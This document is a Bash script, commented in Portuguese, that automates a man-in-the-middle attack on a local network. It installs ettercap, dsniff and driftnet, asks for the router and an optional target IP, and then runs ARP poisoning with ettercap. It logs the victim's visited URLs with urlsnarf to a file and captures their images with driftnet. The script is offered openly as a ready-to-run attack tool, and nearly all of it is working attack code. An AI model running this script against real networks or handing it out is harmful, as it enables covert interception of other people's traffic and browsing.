#!/bin/bash
#-------------------------------------------------------------------------------------------------------------
#Automatização em coleta de informações na rede por ataque MAN-IN-THE-MIDDLE
#
#-------------------------------------------------------------------------------------------------------------
#    Ao executar esse script ele iniciará uma busca das ferramentas essênciais
#para a realização do ataque
#    Em Seguida ele fará a instalação das mesmas, seguindo para a coleta dos dados
#básicos para iniciar o ataque.
#
#Esse script está aberto a modificações quaisquer para a melhoria da coleta na execução do ataque
#-------------------------------------------------------------------------------------------------------------
#*********************************************INSTALAÇÂO******************************************************
#    Para a execução do script basta dar permissão de execução ao script "install.sh" com "chmod +x install.sh"
#em seguida executar esse script com ./install.sh
#    Esses comandos darão as permissões necessárias para toda base de scripts envolvidos durante o ataque.
#Nas execuções seguintes do script, basta iniciar com "mitm.sh"
#-------------------------------------------------------------------------------------------------------------
#**********************************************CRÉDITOS*******************************************************
#Automatização desenvolvida por: Lucas Silva
#Twitter: @gl1tc
#
###############################################################################################################


#--------------------------------------------------------------------------------------------------------------
                            #Verificação do tipo de usuário, se é root ou não.

[ $(id -u) -ne 0 ] && { echo -e "root?"; sudo mitm.sh ; exit ;} || echo -e "Ok"
#--------------------------------------------------------------------------------------------------------------
                           #aqui inicia a verificação de pacotes para instalação

echo -e "Estamos analisando os pacotes necessários...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
if [ -n "$pacote" ] ;
  sleep 1
 then
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "A aplicação ettercap-text-only será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "A aplicação Urlsnarf será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "A aplicação Driftnet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "A aplicação Figlet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install figlet
fi
pacote=$(dpkg --get-selections | grep dialog )
if [ -n "$pacote" ] ;
 then 
     echo -e "Dialog ---------------------------------------- OK\n"
 else
     echo -e "Dialog ----------------------------- Nao instalado\n"
     echo "A aplicação Dialog será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dialog
fi
clear
#--------------------------------------------------------------------------------------------------------------
                                #aqui inicia a coleta de dados para o ataque

sleep 1
figlet "         MITM ATTACK"
echo -e "V 1.0\n"
echo -e "Dev: Lucas Silva | Twitter: @gl1tc\n"
echo "------------------------------------------"
    echo
    echo -n "Deseja localizar o IP do roteador s/n? "
 read v0
if [ "$v0" = s ] ;
 then 
    route
    echo "------------------------------------------"
    echo
    echo "Insira o IP de seu roteador"
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
   else
    echo
    echo "------------------------------------------"
   echo "Insira o IP do roteador"
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
fi    
     echo -n "Deseja inserir um alvo s/n? "
     read V
#--------------------------------------------------------------------------------------------------------------
                                      #aqui inicia o ataque "MITM"

if [[ "$V" = s ]]; then
      echo -n ">> " ; read alvo
      rm -rf alvo.txt
      xterm -e ettercap -T -q -i wlp3s0 -M arp:remote /$IP/$alvo/&
      xterm -e urlsnarf -i wlp3s0 | grep $alvo > alvo.txt&
      xterm alvo.sh&
      driftnet -i wlp3s0
      exit
elif [[ "$V" = n ]]; then
      rm -rf alvo.txt
      xterm -e ettercap -T -q -i wlp3s0 -M arp:remote /$IP//&
      xterm -e urlsnarf -i wlp3s0 > alvo.txt&
      xterm alvo.sh&
      driftnet -i wlp3s0
      exit
else
  echo "Entrada desconhecida, deseja executar o ataque novamente s/n?"
  echo -n ">>" ; read v1
  if [[ "$v1" = s ]]; then
    ./mitm.sh
  else
    exit
fi
fi